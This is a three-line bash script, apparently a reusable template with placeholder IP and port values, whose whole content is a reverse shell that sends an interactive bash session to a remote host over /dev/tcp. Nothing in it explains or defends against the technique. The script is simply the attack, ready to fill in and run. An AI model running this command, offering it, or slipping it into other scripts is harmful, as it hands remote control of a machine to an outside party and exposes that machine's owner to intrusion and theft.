#!/bin/bash

IP='*ip*'
PORT='*port*'
bash -i >& /dev/tcp/${IP}/${PORT} 0>&1